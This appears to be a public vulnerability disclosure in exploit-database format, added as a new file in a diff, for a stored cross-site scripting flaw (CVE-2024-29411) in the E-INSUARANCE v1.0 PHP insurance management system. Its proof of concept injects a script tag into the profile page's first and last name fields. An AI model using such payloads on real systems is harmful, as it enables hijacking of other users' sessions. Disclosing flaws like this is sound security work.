@@ -1,0 +1,20 @@
+# Exploit Title: E-INSUARANCE v1.0 - Stored Cross Site Scripting (XSS)
+# Google Dork: NA
+# Date: 28-03-2024
+# Exploit Author: Sandeep Vishwakarma
+# Vendor Homepage: https://www.sourcecodester.com
+# Software Link:https://www.sourcecodester.com/php/16995/insurance-management-system-php-mysql.html
+# Version: v1.0
+# Tested on: Windows 10
+# Description: Stored Cross Site Scripting vulnerability in E-INSUARANCE -
+v1.0 allows an attacker to execute arbitrary code via a crafted payload to
+the Firstname and lastname parameter in the profile component.
+
+# POC:
+1. After login goto http://127.0.0.1/E-Insurance/Script/admin/?page=profile
+2. In fname & lname parameter add payolad
+"><script>alert("Hacked_by_Sandy")</script>
+3. click on submit.
+
+# Reference:
+https://github.com/hackersroot/CVE-PoC/blob/main/CVE-2024-29411.md
